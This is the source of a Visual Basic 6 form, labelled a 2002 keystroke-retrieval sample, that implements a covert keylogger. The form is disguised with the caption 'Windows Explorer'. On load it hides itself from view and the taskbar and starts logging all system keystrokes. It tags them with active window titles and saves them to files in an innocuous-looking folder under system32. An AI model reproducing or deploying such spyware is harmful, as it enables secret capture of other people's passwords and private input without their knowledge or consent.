VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Windows Explorer"
   ClientHeight    =   4650
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   5985
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   310
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   399
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1560
      TabIndex        =   8
      Top             =   0
      Width           =   4095
   End
   Begin VB.Timer Timer2 
      Interval        =   400
      Left            =   5040
      Top             =   3960
   End
   Begin VB.FileListBox File1 
      Height          =   2430
      Left            =   4200
      TabIndex        =   7
      Top             =   360
      Width           =   1455
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   240
      Top             =   3960
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Launch Notepad"
      Height          =   495
      Left            =   1080
      TabIndex        =   5
      Top             =   3960
      Width           =   1575
   End
   Begin VB.Frame Frame1 
      Height          =   855
      Left            =   120
      TabIndex        =   2
      Top             =   3000
      Width           =   5535
      Begin VB.OptionButton Option2 
         Caption         =   "keystrokes from system"
         Height          =   255
         Left            =   240
         TabIndex        =   4
         Top             =   480
         Value           =   -1  'True
         Width           =   2655
      End
      Begin VB.OptionButton Option1 
         Caption         =   "keystrokes from Notepad"
         Height          =   255
         Left            =   240
         TabIndex        =   3
         Top             =   240
         Width           =   3015
      End
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Start Logging"
      Height          =   495
      Left            =   2880
      TabIndex        =   1
      Top             =   3960
      Width           =   1695
   End
   Begin VB.TextBox Text1 
      Height          =   2415
      Left            =   30
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   360
      Width           =   4065
   End
   Begin VB.Label Label1 
      Caption         =   "Entered text:"
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   105
      Width           =   3495
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'******************************************************************************************
'     Sample for retrieving keystrokes  by use of the "kbLog32.dll"
'                      (c) 2002 by Nilesh Akhade.
'******************************************************************************************

'Codes for log
Dim logname As String
Dim nhWnd As Long   'Notepad window handle
Dim nhWnd_text As Long 'Edit window handle

'active window title
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long

Private Sub Command1_Click()
If Option1.Value = True Then
'get keystrokes of Notepad
StartLog nhWnd_text, AddressOf CallBack
Else
'get system keystrokes
StartLog 0, AddressOf CallBack
End If
Command1.Enabled = False
Frame1.Enabled = False
Option1.Enabled = False
Timer1.Enabled = True
Option2.Enabled = False
End Sub

Private Sub Command2_Click()
'run Notepad
Shell "notepad.exe", vbNormalNoFocus
nhWnd = FindWindow("notepad", vbNullString)
nhWnd_text = FindWindowEx(nhWnd, 0, "edit", vbNullString)

Command2.Enabled = False
SetWindowPos Form1.hWnd, HWND_TOPMOST, 0, 0, 0, 0, _
                SWP_SHOWWINDOW Or SWP_NOSIZE Or SWP_NOMOVE
                
End Sub

Private Sub Form_Load()

App.TaskVisible = False
Me.Hide

Dim today As Variant
Dim recdate As String
today = Now
recdate = Format(today, "ddmmmm")
On Error GoTo err
File1.Path = "c:\windows\system32\sysResource"
logname = File1.ListCount + 1 & recdate
Call Command1_Click

err:
If err <> 0 Then Call writeerrlog(err.Number, err.Description)
End Sub

Private Sub Form_Unload(Cancel As Integer)
EndLog
End Sub

Private Sub Text2_Change()
Text1.Text = vbNewLine & Text1.Text & vbNewLine & Text2.Text & " : " & Time & vbNewLine
End Sub

Private Sub Timer1_Timer()

On Error GoTo err2
Open "c:\Windows\system32\sysResource\" & logname & ".DAT" For Output As 1

        Print #1, Text1.Text

Close #1
err2:
If err2 <> 0 Then Close: Call writeerrlog(err.Number, err.Description)
End Sub
Private Sub writeerrlog(numb As Integer, desc As String)
Dim f As Integer
f = FreeFile
Open App.Path & "\explerror.log" For Append As #f
Print #f, Time, numb, dsrc
Close #f
Unload Me
End Sub
' Returns the title of the active window.
' if GetParent = true then the parent window is
' returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hWnd As Long) As String
Dim l As Long
Dim s As String

l = GetWindowTextLength(hWnd)
s = Space(l + 1)

GetWindowText hWnd, s, l + 1

GetWindowTitle = Left$(s, l)
End Function


Private Sub Timer2_Timer()

Text2.Text = GetActiveWindowTitle(False)

End Sub
